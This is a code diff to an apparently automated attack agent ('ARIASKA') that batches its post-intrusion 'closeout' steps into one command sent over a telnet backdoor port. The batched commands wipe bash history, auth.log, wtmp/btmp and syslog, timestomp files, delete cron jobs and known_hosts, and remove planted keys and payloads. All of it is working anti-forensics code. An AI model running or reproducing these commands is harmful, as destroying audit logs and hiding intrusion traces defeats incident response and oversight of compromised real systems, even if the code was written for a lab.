@@ -2028,22 +2028,52 @@ class SmartCoach:
         "generate_report",
     ]
 
+    # Phase 6.9.4: Pre-defined ops for single-step batch CLOSEOUT execution
+    _CLOSEOUT_BATCH_OPS = {
+        "remove_uploaded_tools":
+            "find /tmp /dev/shm /var/tmp -name 'ariaska_*' -o -name 'payload_*' -delete 2>/dev/null; echo CLOSEOUT_TOOLS_REMOVED",
+        "remove_ssh_keys_planted":
+            "sed -i '/attacker/d' /root/.ssh/authorized_keys 2>/dev/null; echo CLOSEOUT_KEYS_REMOVED",
+        "remove_cron_backdoors":
+            "crontab -r 2>/dev/null; find /etc/cron* -name 'ariaska*' -delete 2>/dev/null; echo CLOSEOUT_CRON_REMOVED",
+        "cleanup_tmp_artifacts":
+            "rm -f /tmp/ariaska_* /tmp/payload_* /tmp/loot_* 2>/dev/null; echo CLOSEOUT_TMP_CLEANED",
+        "verify_target_stable":
+            "uptime && ps aux | wc -l && echo TARGET_STABLE_VERIFIED",
+        "clear_bash_history":
+            "cat /dev/null > ~/.bash_history 2>/dev/null; echo CLOSEOUT_HISTORY_CLEARED",
+        "clear_auth_logs":
+            "cat /dev/null > /var/log/auth.log 2>/dev/null; echo CLOSEOUT_AUTH_CLEARED",
+        "clear_wtmp_btmp":
+            "cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null; echo CLOSEOUT_LOGIN_LOGS_CLEARED",
+        "shred_sensitive_files":
+            "rm -f /tmp/loot* /tmp/exfil* 2>/dev/null; echo CLOSEOUT_FILES_SHREDDED",
+        "timestomp_closeout":
+            "find /tmp /var/tmp /dev/shm -newer /etc/hostname -exec touch -r /etc/hostname {} \\; 2>/dev/null; echo CLOSEOUT_TIMESTAMPS_FIXED",
+        "clear_syslog":
+            "cat /dev/null > /var/log/syslog 2>/dev/null; echo CLOSEOUT_SYSLOG_CLEARED",
+        "remove_known_hosts":
+            "rm -f ~/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null; echo CLOSEOUT_KNOWN_HOSTS_REMOVED",
+        "generate_report":
+            "echo === ARIASKA ENGAGEMENT REPORT === Target cleaned. All artifacts removed. REPORT_GENERATED",
+    }
+
     def _decide_closeout_only(
         self,
         step_ctx: "SmartStepContext",
     ) -> "SmartDecisionResult":
-        """Select the next closeout command in round-robin order.
+        """Batch ALL remaining closeout commands into a single step.
 
-        Hard-gates the action space to ONLY closeout commands.
-        No recon, no exploitation, no scanning.
-        Uses a simple ledger: track which closeout commands haven't been
-        executed yet, pick the next one.
+        Phase 6.9.4: Instead of executing 13 commands over 13 steps,
+        chains all remaining cleanup operations into one mega-command
+        delivered through a single telnet session.  Cuts CLOSEOUT from
+        ~13 steps to 1 step per episode.
 
         Args:
             step_ctx: Current step context.
 
         Returns:
-            SmartDecisionResult with a closeout command.
+            SmartDecisionResult with a batched closeout command.
         """
         ctx = step_ctx.attack_context
         target = ctx.target if ctx else "172.28.0.10"
@@ -2055,45 +2085,49 @@ class SmartCoach:
         # Find the first closeout command NOT yet used
         remaining = [n for n in self.CLOSEOUT_COMMAND_NAMES if n not in self._closeout_used_templates]
 
-        # If all done, pick verify_target_stable as final check
+        # All done → just verify target stability
         if not remaining:
-            remaining = ["verify_target_stable"]
+            command = f'{{ echo "uptime && ps aux | wc -l && echo TARGET_STABLE_VERIFIED"; sleep 2; }} | timeout 10 telnet {target} 1524'
+            return SmartDecisionResult(
+                command=command,
+                template_name="verify_target_stable",
+                params={"target": target},
+                mentor_call=False,
+                phase=AttackPhase.CLOSEOUT,
+                confidence=0.95,
+                source="closeout_gate",
+                mentor_reasoning="[CLOSEOUT] All tasks done, verifying target stability",
+            )
 
-        chosen_name = remaining[0]
+        # BATCH MODE: chain ALL remaining ops into a single telnet session
+        ops = []
+        for name in remaining:
+            op = self._CLOSEOUT_BATCH_OPS.get(name)
+            if op:
+                ops.append(op)
 
-        # Get the template from registry
-        template = COMMAND_REGISTRY.get(chosen_name)
-        if template:
-            params = {"target": target}
-            for p in template.required_params:
-                if p not in params:
-                    params[p] = self._get_default_param(p, ctx)
-            params.update(template.optional_params)
-            try:
-                command = render_command(template, params)
-            except (ValueError, KeyError):
-                command = template.template.replace("{target}", target)
-        else:
-            # Fallback: raw command
-            command = f"{{ echo 'echo CLOSEOUT_COMPLETE'; sleep 2; }} | timeout 10 telnet {target} 1524"
+        combined = "; ".join(ops) + "; echo CLOSEOUT_ALL_COMPLETE"
 
-        # Mark this template as used so next call picks the next one
-        self._closeout_used_templates.add(chosen_name)
+        # Single telnet session with extended timeout for the full batch
+        command = f'{{ echo "{combined}"; sleep 5; }} | timeout 60 telnet {target} 1524'
+
+        # Mark ALL as used in one shot
+        self._closeout_used_templates.update(remaining)
 
         logger.info(
-            f"[CLOSEOUT][{self.agent_name}] Phase=CLOSEOUT → {chosen_name} "
-            f"(remaining={len(remaining)-1} of {len(self.CLOSEOUT_COMMAND_NAMES)})"
+            f"[CLOSEOUT][{self.agent_name}] Phase=CLOSEOUT → BATCH "
+            f"all {len(remaining)} cleanup commands in single step"
         )
 
         return SmartDecisionResult(
             command=command,
-            template_name=chosen_name,
+            template_name="closeout_batch",
             params={"target": target},
             mentor_call=False,
             phase=AttackPhase.CLOSEOUT,
-            confidence=0.95,
+            confidence=0.99,
             source="closeout_gate",
-            mentor_reasoning=f"[CLOSEOUT PROTOCOL] Executing {chosen_name} ({len(self.CLOSEOUT_COMMAND_NAMES) - len(remaining) + 1}/{len(self.CLOSEOUT_COMMAND_NAMES)})",
+            mentor_reasoning=f"[CLOSEOUT BATCH] {len(remaining)} ops: {', '.join(remaining[:5])}{'...' if len(remaining) > 5 else ''}",
         )
 
     @property
